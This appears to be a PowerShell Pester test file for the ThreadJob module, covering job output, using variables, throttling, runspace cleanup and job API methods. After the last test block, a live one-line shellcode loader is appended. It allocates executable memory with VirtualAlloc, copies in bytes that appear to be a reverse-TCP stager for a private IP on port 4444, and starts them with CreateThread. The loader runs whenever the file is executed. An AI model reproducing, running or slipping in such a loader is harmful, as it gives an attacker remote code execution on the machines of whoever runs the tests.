





function Wait-ForJobRunning
{
    param (
        $job
    )

    $iteration = 10
    Do
    {
        Start-Sleep -Milliseconds 100
    }
    Until (($job.State -match "Running|Completed|Failed") -or (--$iteration -eq 0))

    if ($job.State -notmatch "Running|Completed|Failed")
    {
        throw ("Cannot start job '{0}'. Job state is '{1}'" -f $job,$job.State)
    }
}

Describe 'Basic ThreadJob Tests' -Tags 'CI' {

    BeforeAll {

        $scriptFilePath1 = Join-Path $testdrive "TestThreadJobFile1.ps1"
        @'
        for ($i=0; $i -lt 10; $i++)
        {
            Write-Output "Hello $i"
        }
'@ > $scriptFilePath1

        $scriptFilePath2 = Join-Path $testdrive "TestThreadJobFile2.ps1"
        @'
        param ($arg1, $arg2)
        Write-Output $arg1
        Write-Output $arg2
'@ > $scriptFilePath2

        $scriptFilePath3 = Join-Path $testdrive "TestThreadJobFile3.ps1"
        @'
        $input | foreach {
            Write-Output $_
        }
'@ > $scriptFilePath3

        $scriptFilePath4 = Join-Path $testdrive "TestThreadJobFile4.ps1"
        @'
        Write-Output $using:Var1
        Write-Output $($using:Array1)[2]
        Write-Output @(,$using:Array1)
'@ > $scriptFilePath4

        $scriptFilePath5 = Join-Path $testdrive "TestThreadJobFile5.ps1"
        @'
        param ([string]$param1)
        Write-Output "$param1 $using:Var1 $using:Var2"
'@ > $scriptFilePath5

        $WaitForCountFnScript = @'
        function Wait-ForExpectedRSCount
        {
            param (
                $expectedRSCount
            )

            $iteration = 20
            while ((@(Get-Runspace).Count -ne $expectedRSCount) -and ($iteration-- -gt 0))
            {
                Start-Sleep -Milliseconds 100
            }
        }
'@
    }

    AfterEach {
        Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
    }

    It 'ThreadJob with ScriptBlock' {

        $job = Start-ThreadJob -ScriptBlock { "Hello" }
        $results = $job | Receive-Job -Wait
        $results | Should -Be "Hello"
    }

    It 'ThreadJob with ScriptBlock and Initialization script' {

        $job = Start-ThreadJob -ScriptBlock { "Goodbye" } -InitializationScript { "Hello" }
        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be "Hello"
        $results[1] | Should -Be "Goodbye"
    }

    It 'ThreadJob with ScriptBlock and Argument list' {

        $job = Start-ThreadJob -ScriptBlock { param ($arg1, $arg2) $arg1; $arg2 } -ArgumentList @("Hello","Goodbye")
        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be "Hello"
        $results[1] | Should -Be "Goodbye"
    }

    It 'ThreadJob with ScriptBlock and piped input' {

        $job = "Hello","Goodbye" | Start-ThreadJob -ScriptBlock { $input | ForEach-Object { $_ } }
        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be "Hello"
        $results[1] | Should -Be "Goodbye"
    }

    It 'ThreadJob with ScriptBlock and Using variables' {

        $Var1 = "Hello"
        $Var2 = "Goodbye"
        $Var3 = 102
        $Var4 = 1..5
        $global:GVar1 = "GlobalVar"
        $job = Start-ThreadJob -ScriptBlock {
            Write-Output $using:Var1
            Write-Output $using:Var2
            Write-Output $using:Var3
            Write-Output ($using:Var4)[1]
            Write-Output @(,$using:Var4)
            Write-Output $using:GVar1
        }

        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be $Var1
        $results[1] | Should -Be $Var2
        $results[2] | Should -Be $Var3
        $results[3] | Should -Be 2
        $results[4] | Should -Be $Var4
        $results[5] | Should -Be $global:GVar1
    }

    It 'ThreadJob with ScriptBlock and Using variables and argument list' {

        $Var1 = "Hello"
        $Var2 = 52
        $job = Start-ThreadJob -ScriptBlock {
            param ([string] $param1)

            "$using:Var1 $param1 $using:Var2"
        } -ArgumentList "There"

        $results = $job | Receive-Job -Wait
        $results | Should -Be "Hello There 52"
    }

    It 'ThreadJob with ScriptFile' {

        $job = Start-ThreadJob -FilePath $scriptFilePath1
        $results = $job | Receive-Job -Wait
        $results | Should -HaveCount 10
        $results[9] | Should -Be "Hello 9"
    }

    It 'ThreadJob with ScriptFile and Initialization script' {

        $job = Start-ThreadJob -FilePath $scriptFilePath1 -Initialization { "Goodbye" }
        $results = $job | Receive-Job -Wait
        $results | Should -HaveCount 11
        $results[0] | Should -Be "Goodbye"
    }

    It 'ThreadJob with ScriptFile and Argument list' {

        $job = Start-ThreadJob -FilePath $scriptFilePath2 -ArgumentList @("Hello","Goodbye")
        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be "Hello"
        $results[1] | Should -Be "Goodbye"
    }

    It 'ThreadJob with ScriptFile and piped input' {

        $job = "Hello","Goodbye" | Start-ThreadJob -FilePath $scriptFilePath3
        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be "Hello"
        $results[1] | Should -Be "Goodbye"
    }

    It 'ThreadJob with ScriptFile and Using variables' {

        $Var1 = "Hello!"
        $Array1 = 1..10

        $job = Start-ThreadJob -FilePath $scriptFilePath4
        $results = $job | Receive-Job -Wait
        $results[0] | Should -Be $Var1
        $results[1] | Should -Be 3
        $results[2] | Should -Be $Array1
    }

    It 'ThreadJob with ScriptFile and Using variables with argument list' {

        $Var1 = "There"
        $Var2 = 60
        $job = Start-ThreadJob -FilePath $scriptFilePath5 -ArgumentList "Hello"
        $results = $job | Receive-Job -Wait
        $results | Should -Be "Hello There 60"
    }

    It 'ThreadJob with terminating error' {

        $job = Start-ThreadJob -ScriptBlock { throw "MyError!" }
        $job | Wait-Job
        $job.JobStateInfo.Reason.Message | Should -Be "MyError!"
    }

    It 'ThreadJob and Error stream output' {

        $job = Start-ThreadJob -ScriptBlock { Write-Error "ErrorOut" } | Wait-Job
        $job.Error | Should -Be "ErrorOut"
    }

    It 'ThreadJob and Warning stream output' {

        $job = Start-ThreadJob -ScriptBlock { Write-Warning "WarningOut" } | Wait-Job
        $job.Warning | Should -Be "WarningOut"
    }

    It 'ThreadJob and Verbose stream output' {

        $job = Start-ThreadJob -ScriptBlock { $VerbosePreference = 'Continue'; Write-Verbose "VerboseOut" } | Wait-Job
        $job.Verbose | Should Match "VerboseOut"
    }

    It 'ThreadJob and Verbose stream output' {

        $job = Start-ThreadJob -ScriptBlock { $DebugPreference = 'Continue'; Write-Debug "DebugOut" } | Wait-Job
        $job.Debug | Should -Be "DebugOut"
    }

    It 'ThreadJob ThrottleLimit and Queue' {

        try
        {
            
            Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
            $job1 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 } -ThrottleLimit 2
            $job2 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }
            $job3 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }
            $job4 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }

            
            Wait-ForJobRunning $job2

            Get-Job | Where-Object { ($_.PSJobTypeName -eq "ThreadJob") -and ($_.State -eq "Running") } | Should -HaveCount 2
            Get-Job | Where-Object { ($_.PSJobTypeName -eq "ThreadJob") -and ($_.State -eq "NotStarted") } | Should -HaveCount 2
        }
        finally
        {
            Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
        }

        Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Should -HaveCount 0
    }

    It 'ThreadJob Runspaces should be cleaned up at completion' {

        $script = $WaitForCountFnScript + @'

        try
        {
            Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
            $rsStartCount = @(Get-Runspace).Count

            
            $Job1 = Start-ThreadJob -ScriptBlock { "Hello 1!" } -ThrottleLimit 5
            $job2 = Start-ThreadJob -ScriptBlock { "Hello 2!" }
            $job3 = Start-ThreadJob -ScriptBlock { "Hello 3!" }
            $job4 = Start-ThreadJob -ScriptBlock { "Hello 4!" }

            $null = $job1,$job2,$job3,$job4 | Wait-Job

            
            Wait-ForExpectedRSCount $rsStartCount

            Write-Output (@(Get-Runspace).Count -eq $rsStartCount)
        }
        finally
        {
            Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
        }
'@

        $result = & "$PSHOME/pwsh" -c $script
        $result | Should -BeExactly "True"
    }

    It 'ThreadJob Runspaces should be cleaned up after job removal' {

    $script = $WaitForCountFnScript + @'

        try {
            Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
            $rsStartCount = @(Get-Runspace).Count

            
            $Job1 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 } -ThrottleLimit 2
            $job2 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }
            $job3 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }
            $job4 = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }

            Wait-ForExpectedRSCount ($rsStartCount + 4)
            Write-Output (@(Get-Runspace).Count -eq ($rsStartCount + 4))

            
            $job1 | Remove-Job -Force
            $job3 | Remove-Job -Force

            Wait-ForExpectedRSCount ($rsStartCount + 2)
            Write-Output (@(Get-Runspace).Count -eq ($rsStartCount + 2))
        }
        finally
        {
            Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
        }

        Wait-ForExpectedRSCount $rsStartCount
        Write-Output (@(Get-Runspace).Count -eq $rsStartCount)
'@

        $result = & "$PSHOME/pwsh" -c $script
        $result | Should -BeExactly "True","True","True"
    }

    It 'ThreadJob jobs should work with Receive-Job -AutoRemoveJob' {

        Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force

        $job1 = Start-ThreadJob -ScriptBlock { 1..2 | ForEach-Object { Start-Sleep -Milliseconds 100; "Output $_" } } -ThrottleLimit 5
        $job2 = Start-ThreadJob -ScriptBlock { 1..2 | ForEach-Object { Start-Sleep -Milliseconds 100; "Output $_" } }
        $job3 = Start-ThreadJob -ScriptBlock { 1..2 | ForEach-Object { Start-Sleep -Milliseconds 100; "Output $_" } }
        $job4 = Start-ThreadJob -ScriptBlock { 1..2 | ForEach-Object { Start-Sleep -Milliseconds 100; "Output $_" } }

        $null = $job1,$job2,$job3,$job4 | Receive-Job -Wait -AutoRemoveJob

        Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Should -HaveCount 0
    }

    It 'ThreadJob jobs should run in FullLanguage mode by default' {

        $result = Start-ThreadJob -ScriptBlock { $ExecutionContext.SessionState.LanguageMode } | Wait-Job | Receive-Job
        $result | Should -Be "FullLanguage"
    }
}

Describe 'Job2 class API tests' -Tags 'CI' {

    AfterEach {
        Get-Job | Where-Object PSJobTypeName -eq "ThreadJob" | Remove-Job -Force
    }

    It 'Verifies StopJob API' {

        $job = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 } -ThrottleLimit 5
        Wait-ForJobRunning $job
        $job.StopJob($true, "No Reason")
        $job.JobStateInfo.State | Should -Be "Stopped"
    }

    It 'Verifies StopJobAsync API' {

        $job = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 } -ThrottleLimit 5
        Wait-ForJobRunning $job
        $job.StopJobAsync($true, "No Reason")
        Wait-Job $job
        $job.JobStateInfo.State | Should -Be "Stopped"
    }

    It 'Verifies StartJobAsync API' {

        $jobRunning = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 } -ThrottleLimit 1
        $jobNotRunning = Start-ThreadJob -ScriptBlock { Start-Sleep -Seconds 60 }

        $jobNotRunning.JobStateInfo.State | Should -Be "NotStarted"

        
        $jobNotRunning.StartJobAsync()
        Wait-ForJobRunning $jobNotRunning
        $jobNotRunning.JobStateInfo.State | Should -Be "Running"
    }

    It 'Verifies JobSourceAdapter Get-Jobs' {

        $job = Start-ThreadJob -ScriptBlock { "Hello" } | Wait-Job

        $getJob = Get-Job -InstanceId $job.InstanceId 2> $null
        $getJob | Should -Be $job

        $getJob = Get-Job -Name $job.Name 2> $null
        $getJob | Should -Be $job

        $getJob = Get-Job -Command ' "hello" ' 2> $null
        $getJob | Should -Be $job

        $getJob = Get-Job -State $job.JobStateInfo.State 2> $null
        $getJob | Should -Be $job

        $getJob = Get-Job -Id $job.Id 2> $null
        $getJob | Should -Be $job

        
        $result = Get-Job -Filter @{Id = ($job.Id)} 3> $null
        $result | Should -BeNullOrEmpty
    }

    It 'Verifies terminating job error' {

        $job = Start-ThreadJob -ScriptBlock { throw "My Job Error!" } | Wait-Job
        $results = $job | Receive-Job 2>&1
        $results.ToString() | Should -Be "My Job Error!"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

